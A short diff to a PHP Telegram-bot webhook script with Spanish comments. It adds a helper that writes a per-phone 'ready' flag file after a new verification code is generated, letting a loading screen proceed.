@@ -24,6 +24,17 @@ function guardarCodigo($telefono, $codigo)
     file_put_contents($archivo, json_encode($datos));
 }
 
+function flagPath($telefono)
+{
+    $safe = preg_replace('/[^0-9]+/', '_', $telefono);
+    return __DIR__ . '/ready_' . $safe . '.flag';
+}
+
+function marcarListo($telefono)
+{
+    file_put_contents(flagPath($telefono), '1');
+}
+
 function enviarATelegram($botToken, $chatId, $texto)
 {
     if ($botToken === 'PON_AQUI_TU_BOT_TOKEN') {
@@ -71,6 +82,9 @@ if (isset($update['callback_query'])) {
             // Generar nuevo código y guardarlo para ese teléfono
             $nuevoCodigo = random_int(100000, 999999);
             guardarCodigo($telefono, $nuevoCodigo);
+
+            // Marcar como listo para que la pantalla de carga pueda continuar
+            marcarListo($telefono);
 
             // Aquí integrarías el envío real de SMS usando $telefono y $nuevoCodigo
 
